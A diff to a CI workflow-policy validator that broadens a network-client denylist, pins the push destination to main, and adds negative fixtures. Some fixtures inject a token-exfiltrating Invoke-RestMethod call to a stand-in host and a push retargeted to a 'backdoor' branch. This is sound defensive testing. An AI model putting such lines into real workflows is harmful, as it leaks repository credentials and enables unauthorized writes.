@@ -138,6 +138,12 @@ const REVIEWED_PARSER = Object.freeze({
   integrity: 'sha512-2AvhNX3mb8zd6Zy7INTtSpl1F15HW6Wnqj0srWlkKLcpYl/gMIMJiyuGq2KeI2YFxUPjdlB+3Lc10seMLtL4cA==',
 });
 
+// Naming three cmdlets left every other client open, including Invoke-RestMethod
+// and the .NET networking types, in steps that hold a contents-write token. No
+// governed step performs network I/O, so the denylist covers the client surface
+// rather than a sample of it. Deliberately no /g flag: this is reused with test().
+const NETWORK_CLIENT = /\b(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|irm|Start-BitsTransfer|Net\.WebClient|WebClient|HttpClient|WebRequest|TcpClient|UdpClient|HttpListener|Socket)\b|System\.Net\./iu;
+
 const EXPECTED_VERSION = '1.0.20260731.0';
 const MAXIMUM_YAML_BYTES = 1024 * 1024;
 const MAXIMUM_NODE_COUNT = 10000;
@@ -358,10 +364,22 @@ export function validateBuildPolicy(workflow, source) {
       !pushStep.run.includes('--force-with-lease=refs/heads/main:')) {
     reject('side-effect-policy', 'temporary writer push containment changed');
   }
+  // --force-with-lease scopes the lease, not the destination. The destination is
+  // the separate refspec argument, so it must be asserted on its own or a
+  // contents-write token could create an arbitrary branch while main is untouched.
+  if (!pushStep.run.includes("ArgumentList.Add('HEAD:refs/heads/main')")) {
+    reject('side-effect-policy', 'temporary writer push destination is not HEAD:refs/heads/main');
+  }
+  for (const match of pushStep.run.matchAll(/refs\/heads\/([^'":\s]+)/gu)) {
+    if (match[1] !== 'main') reject('side-effect-policy', 'temporary writer references a branch other than main');
+  }
+  if ((pushStep.run.match(/ArgumentList\.Add\('push'\)/gu) ?? []).length !== 1) {
+    reject('side-effect-policy', 'temporary writer does not invoke push exactly once');
+  }
 
   for (const { jobId, id, run, step } of allRunSteps(workflow)) {
     if ('continue-on-error' in step) reject('failure-policy', `${jobId}.${id} sets continue-on-error`);
-    if (/\b(?:curl|wget|Invoke-WebRequest)\b/iu.test(run)) reject('network-policy', `${jobId}.${id} adds a network client`);
+    if (NETWORK_CLIENT.test(run)) reject('network-policy', `${jobId}.${id} adds a network client`);
     // Scan the whole step, not just run or env values: a credential reaches the
     // script through any step key just as effectively as through script text.
     const serialized = JSON.stringify(step);
@@ -507,8 +525,21 @@ export function validateMarkdownPolicy(workflow, source) {
       (validation.run.match(/^\s*& \$strNpmPath run lint:md:nested\s*$/gmu) ?? []).length !== 1) {
     reject('markdown-policy', 'each locked lint script must run exactly once');
   }
-  if (/continue-on-error|secrets\.|\b(?:curl|wget|Invoke-WebRequest)\b/iu.test(source)) {
+  if (/continue-on-error|secrets\./iu.test(source) || NETWORK_CLIENT.test(source)) {
     reject('markdown-policy', 'Markdown workflow weakens failure, credential, or network policy');
+  }
+  // Each captured phase status must be assigned exactly once, from $LASTEXITCODE.
+  // Otherwise a later reassignment such as "$intPolicyExit = 0" leaves every
+  // fragment, ordering, and command count intact while the deferred final check
+  // sees only zeros and reports success over a failed phase.
+  for (const strName of ['intNodeVersionExit', 'intNpmVersionExit', 'intInstallExit', 'intPolicyExit', 'intOuterExit', 'intNestedExit']) {
+    const arrAssignments = validation.run.match(new RegExp(`\\$${strName}\\s*=`, 'gu')) ?? [];
+    if (arrAssignments.length !== 1) {
+      reject('markdown-policy', `captured phase status ${strName} is not assigned exactly once`);
+    }
+    if (!validation.run.includes(`$${strName} = $LASTEXITCODE`)) {
+      reject('markdown-policy', `captured phase status ${strName} is not taken from $LASTEXITCODE`);
+    }
   }
 
   validateActionMultiset(source, [ACTIONS.checkout, ACTIONS.setupNode]);
@@ -660,6 +691,9 @@ const FIXTURE_INVENTORY = Object.freeze([
   ['T1-BUILD-039', 'credential env on the writer script step', 'build', (source) => replaceOnce(source, '        id: prepare-generated-commit\n        shell: pwsh\n', '        id: prepare-generated-commit\n        shell: pwsh\n        env:\n          TOKEN: ${{ secrets.PAT }}\n')],
   ['T1-BUILD-040', 'unreviewed key on a script step', 'build', (source) => replaceOnce(source, '        id: generate-and-verify\n        shell: pwsh\n', '        id: generate-and-verify\n        shell: pwsh\n        working-directory: .\n')],
   ['T1-BUILD-041', 'native-command error mapping guard removed', 'build', (source) => replaceOnce(source, '          if (Test-Path Variable:PSNativeCommandUseErrorActionPreference) {\n              $PSNativeCommandUseErrorActionPreference = $false\n          }\n', '')],
+  ['T1-BUILD-044', 'push destination retargeted off main', 'build', (source) => replaceOnce(source, "ArgumentList.Add('HEAD:refs/heads/main')", "ArgumentList.Add('HEAD:refs/heads/backdoor')")],
+  ['T1-BUILD-045', 'second push invocation added', 'build', (source) => replaceOnce(source, "              [void]$objStartInfo.ArgumentList.Add('push')\n", "              [void]$objStartInfo.ArgumentList.Add('push')\n              [void]$objStartInfo.ArgumentList.Add('push')\n")],
+  ['T1-BUILD-046', 'alternate network client in a token-bearing step', 'build', (source) => replaceOnce(source, '          $strToken = $env:STYLE_GUIDE_PUSH_TOKEN', '          Invoke-RestMethod -Uri https://example.invalid -Body $env:STYLE_GUIDE_PUSH_TOKEN\n          $strToken = $env:STYLE_GUIDE_PUSH_TOKEN')],
   ['T1-MARKDOWN-001', 'floating Node major', 'markdown', (source) => replaceOnce(source, "          node-version: '24.18.1'", "          node-version: '24'")],
   ['T1-MARKDOWN-002', 'latest Node', 'markdown', (source) => replaceOnce(source, "          node-version: '24.18.1'", "          node-version: 'latest'")],
   ['T1-MARKDOWN-003', 'setup cache enabled', 'markdown', (source) => replaceOnce(source, '          package-manager-cache: false', '          package-manager-cache: true')],
@@ -682,6 +716,7 @@ const FIXTURE_INVENTORY = Object.freeze([
     return replaceOnce(replaceOnce(source, strValidator, ''), strNested, strValidator + strNested);
   }],
   ['T1-MARKDOWN-014', 'native-command error mapping guard removed', 'markdown', (source) => replaceOnce(source, '          if (Test-Path Variable:PSNativeCommandUseErrorActionPreference) {\n              $PSNativeCommandUseErrorActionPreference = $false\n          }\n', '')],
+  ['T1-MARKDOWN-017', 'captured phase status reset before the final check', 'markdown', (source) => replaceOnce(source, '          $strPackageFinal = (Get-FileHash', '          $intPolicyExit = 0\n          $strPackageFinal = (Get-FileHash')],
   ['T1-DEPENDABOT-001', 'duplicate updates', 'dependabot', 'version: 2\nupdates:\n  - package-ecosystem: github-actions\n    directory: /\n    schedule: { interval: weekly }\n  - package-ecosystem: github-actions\n    directory: /\n    schedule: { interval: weekly }\n'],
   ['T1-DEPENDABOT-002', 'npm update introduced early', 'dependabot', 'version: 2\nupdates:\n  - package-ecosystem: npm\n    directory: /.github/workflows\n    schedule: { interval: weekly }\n'],
   ['T1-DEPENDABOT-003', 'auto-merge key', 'dependabot', 'version: 2\nupdates:\n  - package-ecosystem: github-actions\n    directory: /\n    schedule: { interval: weekly }\n    auto-merge: true\n'],
@@ -815,6 +850,11 @@ export function validateRepositoryPolicy(buildPath, markdownPath) {
   const packageSource = readOrdinaryText(join(workflowDirectory, 'package.json'), 'package.json');
   const lockSource = readOrdinaryText(join(workflowDirectory, 'package-lock.json'), 'package-lock.json');
   validatePackagePolicy(packageSource, lockSource);
+  // The digest covered every governed input but not the implementation defining
+  // what those inputs were checked against, so removing an assertion here left
+  // the reported hash unchanged. Evidence for a policy run has to bind the rules
+  // as well as the material.
+  const validatorSource = readOrdinaryText(join(workflowDirectory, 'Validate-WorkflowPolicy.mjs'), 'validator');
 
   const fixtureCount = runNegativeFixtures(buildSource, markdownSource, packageSource, lockSource);
   return Object.freeze({
@@ -833,6 +873,7 @@ export function validateRepositoryPolicy(buildPath, markdownPath) {
       .update(generatorSource)
       .update(packageSource)
       .update(lockSource)
+      .update(validatorSource)
       .digest('hex'),
   });
 }
